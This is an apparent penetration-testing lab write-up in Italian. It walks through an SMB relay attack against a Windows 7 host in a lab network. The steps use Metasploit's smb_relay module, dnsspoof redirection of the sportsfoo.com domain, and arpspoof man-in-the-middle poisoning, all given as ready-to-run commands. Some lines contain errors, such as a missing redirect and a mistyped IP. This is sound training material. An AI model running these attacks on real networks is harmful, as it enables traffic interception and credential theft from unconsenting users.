# SMB Relay Attack

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Attenzione, leggere bene la documentazione del lab perché spiega qual è la rete su cui siamo e quali sono i nostri obiettivi
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Il punto 2. significa: Nessun Brute Force Attack!

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

C'è un gateway tra le due reti più esterna e più interna.

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Ed infine ci sono le soluzioni.

## Set up the SMB Relay using a MSF module

```
msfconsole
search smb_relay
use exploit/windows/smb/smb_relay
show options
set SRVHOST 172.16.5.101 //IP nostra Kali attaccante
set LHOST 172.16.5.101 //stesso IP nostra Kali attaccante
set SMBHOST 172.16.5.10 //l'IP del target
exploit
```

ima di proseguire oltre verifichiamo l'IP della nostra macchina Kali attaccante con ifconfig su altro terminale:

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Ok continuiamo su metasploit:

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

## Configuriamo DNS Spoofing

In modo da redirezionare la vittima alla nostra macchina Kali Linux ogni volta che c'è una connessione a qualsiasi host nel dominio (sportsfoo.com)

Apriamo quindi un nuovo TAB e creiamo un file che emula un host file o un file che contiene record DNS

```
echo "172.16.5.101 *.sportsfoo.com" > dns  //andiamo a redirezionare qualsiasi sottodominio del top level domain alla nostra macchina attaccante
dnsspoof -i eth1 -f dns
```

Il file dns che abbiamo creato ha l'obiettivo di redirezionare ogni richiesta ad un dominio o sottodominio di sportsfoo.com al nostro sistema kali linux.

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

## Impostiamo l'attacco Man in the Middle con ARP Spoofing

L'obiettivo è quello di fare poisoning del traffico tra la vittima (Windows 7, 172.16.5.5) ed il default gateway (172.16.5.1).

Questo ci consente di manipolare il traffico con DNS Spoof che abbiamo già impostato e running.

Apriamo un altro terminale

```
echo 1 /proc/sys/net/ipv4/ip_forward //abilitiamo IP forwarding
```

## Avviamo l'ARP spoof dell'attacco

Ora, in due terminali separati, avviamo l'ARP spoof attack contro il sistema vittima Windows 7 e il Gateway.

### Terminale 1: Client Windows 7

```
arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
```

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

### Terminale 2: Gateway

Apriamo un nuovo tab del terminale e facciamo il'ARP spoof contro il gateway facendo poisoning di quel traffico

```
arpspoof -i eth1 172.16.5.1 182.16.5.5
```

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

ARP Poisoning: \
Ora quello che sta succedendo è che ogni volta che il sistema vittima Windows 7 avvia una SMB connection, il DNSspoof assieme all'ARPspoof forges (crea) una risposta DNS che dice alla vittima che l'indirizzo DNS che sta cercando la vittima si risolve (resolves) con l'indirizzo IP del sistema Kali attaccante.

Se andiamo nel secondo tab dove abbiamo fatto (performed) il DNS spoofing, dovremmo iniziare a vedere delle richieste per dei domini o sottodomini specifici.

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

Nel frattempo riguardiamo lo schema di rete:

<figure><img src="../../.gitbook/assets/image (986).png" alt=""><figcaption></figcaption></figure>

